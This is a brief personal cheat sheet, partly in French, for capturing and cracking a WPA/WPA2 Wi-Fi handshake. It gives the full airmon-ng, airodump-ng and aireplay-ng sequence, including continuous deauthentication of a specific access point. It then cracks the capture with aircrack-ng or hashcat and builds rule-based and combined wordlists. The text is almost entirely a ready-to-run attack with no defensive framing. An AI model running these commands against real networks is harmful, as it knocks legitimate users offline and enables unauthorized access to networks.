
TODO : https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#handshake-capture

```bash
airmon-ng check kill
airmon-ng start wlp0s20f3
airodump-ng wlp0s20f3mon -c 11 --bssid C8:B5:AD:35:B7:80 -w /tmp/psk --output-format pcap
aireplay-ng -0 0 -a C8:B5:AD:35:B7:80 wlp0s20f3mon

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b C8:B5:AD:35:B7:80 ./psk-01.cap
# or
hcxpcapngtool --all -o dump.hashcat psk-01.cap
hashcat -m 22000 -r OneRuleToRuleThemAll.rule dump.hashcat wordlist.txt
```

générer une wordlist à partir d'une liste de mots

```bash
hashcat wordlist-origin.txt -r OneRuleToRuleThemAll.rule --stdout > wordlist.txt
# avec -a 1 => ça fait de la combinaison des dictionnaires 
hashcat -m 22000 -a 1 hashes.txt wordlist.txt wordlist.txt
```

